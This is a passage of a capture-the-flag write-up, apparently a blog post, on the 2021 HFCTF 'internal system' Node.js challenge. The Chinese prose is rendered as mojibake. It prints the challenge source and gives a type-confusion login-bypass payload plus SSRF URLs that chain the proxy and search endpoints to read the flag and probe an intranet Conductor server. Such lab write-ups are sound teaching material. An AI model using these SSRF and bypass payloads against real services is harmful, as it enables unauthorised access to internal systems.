punctuation">)</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/proxy'</span><span class="token punctuation">,</span> <span class="token keyword">async</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>admin<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/index'</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token comment">// test url</span>    <span class="token comment">// not implemented here</span>    <span class="token keyword">const</span> url <span class="token operator">=</span> <span class="token string">"https://postman-echo.com/post"</span>    <span class="token keyword">await</span> axios<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">http://127.0.0.1:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>port<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/search?url=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>url<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'base'</span><span class="token punctuation">,</span> <span class="token string">"Something needs to be implemented"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>router<span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token string">'/search'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">127\.0\.0\.1</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">{</span>title<span class="token operator">:</span> <span class="token string">'Error'</span><span class="token punctuation">,</span> content<span class="token operator">:</span> <span class="token string">'You can only use proxy to aceess here!'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">const</span> result <span class="token operator">=</span> <span class="token punctuation">{</span>title<span class="token operator">:</span> <span class="token string">'Search Success'</span><span class="token punctuation">,</span> content<span class="token operator">:</span> <span class="token string">''</span><span class="token punctuation">}</span>    <span class="token keyword">const</span> method <span class="token operator">=</span> req<span class="token punctuation">.</span>method<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">const</span> url <span class="token operator">=</span> <span class="token function">decodeURI</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>url<span class="token punctuation">)</span>    <span class="token keyword">const</span> data <span class="token operator">=</span> req<span class="token punctuation">.</span>body    <span class="token keyword">try</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>method <span class="token operator">==</span> <span class="token string">'get'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">const</span> response <span class="token operator">=</span> <span class="token keyword">await</span> axios<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>            result<span class="token punctuation">.</span>content <span class="token operator">=</span> <span class="token function">formatResopnse</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>method <span class="token operator">==</span> <span class="token string">'post'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">const</span> response <span class="token operator">=</span> <span class="token keyword">await</span> axios<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span>            result<span class="token punctuation">.</span>content <span class="token operator">=</span> <span class="token function">formatResopnse</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            result<span class="token punctuation">.</span>title <span class="token operator">=</span> <span class="token string">'Error'</span>            result<span class="token punctuation">.</span>content <span class="token operator">=</span> <span class="token string">'Unsupported Method'</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">{</span>        result<span class="token punctuation">.</span>title <span class="token operator">=</span> <span class="token string">'Error'</span>        result<span class="token punctuation">.</span>content <span class="token operator">=</span> error<span class="token punctuation">.</span>message    <span class="token punctuation">}</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/source'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>    res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span> __dirname <span class="token operator">+</span> <span class="token string">"/"</span> <span class="token operator">+</span> <span class="token string">"route.js"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">127\.0\.0\.1</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">{</span>title<span class="token operator">:</span> <span class="token string">'Error'</span><span class="token punctuation">,</span> content<span class="token operator">:</span> <span class="token string">'No Flag For You!'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span>hint<span class="token operator">:</span> hint<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router</code></pre><p>é¦–å…ˆéœ€è¦ç™»å½•ï¼Œè¿™é‡Œç”¨åˆ°äº† JavaScript å¼±ç±»å‹çš„ç‰¹æ€§ã€‚</p><p>å‚è€ƒ <a href="https://www.gem-love.com/websecurity/2037.html">SuSeC CTF 2020 Writeup &amp; åŸºäºNode.JSçš„sha1ç»•è¿‡åˆ†æ</a> </p><p>ä»¥åŠ <a href="https://d6s3.ac.cn/post/nodejs-url-library-character-mapping-problem/">Node.jsä¸­url.parseå‡½æ•°çš„æ½œåœ¨å®‰å…¨é—®é¢˜</a></p><p>JavaScript åœ¨ä½¿ç”¨åŠ å·æ‹¼æ¥çš„æ—¶å€™æœ€ç»ˆä¼šå¾—åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²(string)ï¼Œäºæ˜¯ä¸ä¼šå½±å“ sha256 çš„å¤„ç†ã€‚</p><p><img src="/2021/04/05/CTF_2021HFCTF_internal_system/image-20210404235528295.png"></p><p>è¿™é‡Œæ˜¯ç”¨ GET query ä¼ å‚ï¼Œå¯ä»¥æ„é€  payload</p><pre class="language-none"><code class="language-none">username[]=admin&amp;password=admin</code></pre><p>å°±èƒ½æˆåŠŸä»¥ç®¡ç†å‘˜èº«ä»½è¿›å…¥ã€‚</p><p>æ¥ä¸‹æ¥æ‰“ ssrfâ€¦â€¦</p><h3 id="Step-02-SSRF-æ‹¿-hint"><a href="#Step-02-SSRF-æ‹¿-hint" class="headerlink" title="Step 02 SSRF æ‹¿ hint"></a>Step 02 SSRF æ‹¿ hint</h3><p>ç™»å½•ä¹‹åï¼Œèµµæ€»è¿™é‡Œç»™å‡ºäº†ç½‘ç»œæ¥å£ç›¸å…³çš„å‚æ•°ï¼Œæ¯”èµ›ç¯å¢ƒé‡Œå€’æ²¡æœ‰ï¼Œå¾—ççŒœã€‚</p><p>ä¸è¿‡ docker å†…ç½‘é»˜è®¤æ˜¯ 172.1x.0.x å¼€å§‹å€’æ˜¯äº†ã€‚</p><p><img src="/2021/04/05/CTF_2021HFCTF_internal_system/image-20210405151112755.png"></p><p>è¿™é‡Œæäº¤çš„ URL ä¼šè°ƒç”¨ <code>GET /proxy</code> æ¥å£ã€‚å†æ¥çœ‹æºç ã€‚</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token constant">SSRF_WAF</span><span class="token punctuation">(</span><span class="token parameter">url</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> host <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UrlParse</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\[|\]</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">isIp</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token constant">IP</span><span class="token punctuation">.</span><span class="token function">isPublic</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token constant">FLAG_WAF</span><span class="token punctuation">(</span><span class="token parameter">url</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> pathname <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UrlParse</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>pathname    <span class="token keyword">return</span> <span class="token operator">!</span>pathname<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token constant">OTHER_WAF</span><span class="token punctuation">(</span><span class="token parameter">url</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">const</span> <span class="token constant">WAF_LISTS</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token constant">OTHER_WAF</span><span class="token punctuation">,</span> <span class="token constant">SSRF_WAF</span><span class="token punctuation">,</span> <span class="token constant">FLAG_WAF</span><span class="token punctuation">]</span> <span class="token comment">// ...</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/proxy'</span><span class="token punctuation">,</span> <span class="token keyword">async</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>admin<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/index'</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">const</span> url <span class="token operator">=</span> <span class="token function">decodeURI</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">const</span> status <span class="token operator">=</span> <span class="token constant">WAF_LISTS</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">waf</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token function">waf</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span>b</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span>a<span class="token operator">&amp;&amp;</span>b<span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>status<span class="token punctuation">)</span> <span class="token punctuation">{</span>        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'base'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>title<span class="token operator">:</span> <span class="token string">'WAF'</span><span class="token punctuation">,</span> content<span class="token operator">:</span> <span class="token string">"Here is the waf..."</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token keyword">const</span> response <span class="token operator">=</span> <span class="token keyword">await</span> axios<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">http://127.0.0.1:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>port<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/search?url=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>url<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>            res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'base'</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">{</span>            res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'base'</span><span class="token punctuation">,</span> error<span class="token punctuation">.</span>message<span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>è¿™å‡ ä¸ª WAF éœ€è¦è¾“å…¥çš„ URL Host ä¸ºå…¬ç½‘ IPï¼Œä¸”ç›®å½•ä¸ä»¥ <code>/flag</code> å¼€å¤´ã€‚</p><p>è¿™ä¸ª NodeJS æœåŠ¡é»˜è®¤æ˜¯å¼€åœ¨ 3000 ç«¯å£ï¼Œä½†æ˜¯å¦‚æœç›´æ¥è®¿é—® <code>http://127.0.0.1:3000/</code> ä¼šè¢« WAF ç»™æ‹¦ä½ã€‚</p><p><img src="/2021/04/05/CTF_2021HFCTF_internal_system/image-20210405151824896.png"></p><p>è¯•äº†è¯•è®¿é—®è‡ªå·±çš„ VPSï¼Œæ˜¯èƒ½é€šçš„ã€‚</p><p>è€ƒè™‘åˆ°æœºå™¨ä¸Šçš„æœåŠ¡ä¸€èˆ¬ç›‘å¬ 0.0.0.0ï¼Œäºæ˜¯æ„é€  URL</p><pre class="language-none"><code class="language-none">/proxy?url=http://0.0.0.0:3000/</code></pre><p>æˆåŠŸè®¿é—®åˆ°äº†å½“å‰ç«™ç‚¹çš„é¦–é¡µã€‚</p><p><img src="/2021/04/05/CTF_2021HFCTF_internal_system/image-20210405152254860.png"></p><p>æˆ‘ä»¬éœ€è¦è®¿é—®çš„æ˜¯ <code>/flag</code>ï¼Œä¸ºäº†ç»•è¿‡ WAFï¼Œå¯ä»¥åˆ©ç”¨ <code>/search</code> æ¥å£ã€‚</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">router<span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token string">'/search'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">127\.0\.0\.1</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">{</span>title<span class="token operator">:</span> <span class="token string">'Error'</span><span class="token punctuation">,</span> content<span class="token operator">:</span> <span class="token string">'You can only use proxy to aceess here!'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">const</span> result <span class="token operator">=</span> <span class="token punctuation">{</span>title<span class="token operator">:</span> <span class="token string">'Search Success'</span><span class="token punctuation">,</span> content<span class="token operator">:</span> <span class="token string">''</span><span class="token punctuation">}</span>    <span class="token keyword">const</span> method <span class="token operator">=</span> req<span class="token punctuation">.</span>method<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">const</span> url <span class="token operator">=</span> <span class="token function">decodeURI</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>url<span class="token punctuation">)</span>    <span class="token keyword">const</span> data <span class="token operator">=</span> req<span class="token punctuation">.</span>body    <span class="token keyword">try</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>method <span class="token operator">==</span> <span class="token string">'get'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">const</span> response <span class="token operator">=</span> <span class="token keyword">await</span> axios<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>            result<span class="token punctuation">.</span>content <span class="token operator">=</span> <span class="token function">formatResopnse</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>method <span class="token operator">==</span> <span class="token string">'post'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">const</span> response <span class="token operator">=</span> <span class="token keyword">await</span> axios<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span>            result<span class="token punctuation">.</span>content <span class="token operator">=</span> <span class="token function">formatResopnse</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            result<span class="token punctuation">.</span>title <span class="token operator">=</span> <span class="token string">'Error'</span>            result<span class="token punctuation">.</span>content <span class="token operator">=</span> <span class="token string">'Unsupported Method'</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">{</span>        result<span class="token punctuation">.</span>title <span class="token operator">=</span> <span class="token string">'Error'</span>        result<span class="token punctuation">.</span>content <span class="token operator">=</span> error<span class="token punctuation">.</span>message    <span class="token punctuation">}</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>æ„é€  payload</p><pre class="language-none"><code class="language-none">/proxy?url=http://0.0.0.0:3000/search?url=http://127.0.0.1:3000/flag</code></pre><p><img src="/2021/04/05/CTF_2021HFCTF_internal_system/image-20210405152600578.png"></p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"title"</span><span class="token operator">:</span><span class="token string">"Search Success"</span><span class="token punctuation">,</span><span class="token property">"content"</span><span class="token operator">:</span><span class="token string">"{\"hint\":\"someone else also deploy a netflix conductor server in Intranet?\"}"</span><span class="token punctuation">}</span></code></pre><p>æç¤ºåœ¨å†…ç½‘ä¸­æœ‰ä¸€ä¸ª netflix conductor serverã€‚</p><p>æœä¸€ä¸‹ï¼Œè¿™æ˜¯ä¸€ä¸ªå¾®æœåŠ¡ç¼–æ’å·¥å…·ã€‚</p><blockquote><p><a href="https://github.com/Netflix/conductor">https://github.com/Netflix/conductor</a></p><p><a href="https://netflix.github.io/conductor/">https://netflix.github.io/conductor/</a></p><p>Conductor is an <em>orchestration</em> engine that runs in the cloud.</p></blockquote><h3 id="Step-03-å†…ç½‘æ‰¾-Conductor-æœåŠ¡"><a href="#Step-03-å†…ç½‘æ‰¾-Conductor-æœåŠ¡" class="headerlink" title="Step 03 å†…ç½‘æ‰¾ Conductor æœåŠ¡"></a>Step 03 å†…ç½‘æ‰¾ Conductor æœåŠ¡</h3><p>å®ƒé»˜è®¤æ˜¯å¼€åœ¨ 8080 ç«¯å£ï¼Œäºæ˜¯åœ¨å†…ç½‘ä¸­æ‰¾ä¸€æ‰¾/æ‰«ä¸€æ‰«ã€‚</p><p>æœ¬æœºä¸Šæ˜¯æ²¡æœ‰çš„ï¼Œåœ¨ç»™å‡ºçš„å†…ç½‘ç½‘æ®µé‡Œæ‰¾ä¸€æ‰¾ï¼Œå‘ç°æœ‰äº†ã€‚</p><pre class="language-none"><code class="language-none">/proxy?url=http://0.0.0.0:3000/search?url=http://10.0.122.14:8080</code></pre><p><img src="/2021/04/05/CTF_2021HFCTF_internal_system/image-20210405152950307.png"></p><p>è¿™æ˜¯ä¸€ä¸ª Swagger UIï¼Œä¹Ÿå°±æ˜¯ä¸ª API æ¥å£æ–‡æ¡£ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Swagger UI<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>icon<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>image/png<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>images/favicon-32x32.png<span class="token punctuation">"</span></span> <span class="token attr-name">sizes</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>32x32<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>icon<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>image/png<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>images/favicon-16x16.png<span class="token punctuation">"</span></span> <span class="token attr-name">sizes</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>16x16<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>css/typography.css<span class="token punctuation">'</span></span> <span class="token attr-name">media</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>screen<span class="token punctuation">'</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>stylesheet<span class="token punctuation">'</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>text/css<span class="token punctuation">'</span></span><span class="token punctuation">/&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>css/reset.css<span class="token punctuation">'</span></span> <span class="token attr-name">media</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>screen<span class="token punctuation">'</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>stylesheet<span class="token punctuation">'</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>text/css<span class="token punctuation">'</span></span><span class="token punctuation">/&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>css/screen.css<span class="token punctuation">'</span></span> <span class="token attr-name">media</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>screen<span class="token punctuation">'</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>stylesheet<span class="token punctuation">'</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>text/css<span class="token punctuation">'</span></span><span class="token punctuation">/&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>css/reset.css<span class="token punctuation">'</span></span> <span class="token attr-name">media</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>print<span class="token punctuation">'</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>stylesheet<span class="token punctuation">'</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>text/css<span class="token punctuation">'</span></span><span class="token punctuation">/&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>css/print.css<span class="token punctuation">'</span></span> <span class="token attr-name">media</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>print<span class="token punctuation">'</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>stylesheet<span class="token punctuation">'</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>text/css<span class="token punctuation">'</span></span><span class="token punctuation">/&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>lib/object-assign-pollyfill.js<span class="token punctuation">'</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>text/javascript<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>lib/jquery-1.8.0.min.js<span class="token punctuation">'</span></span> 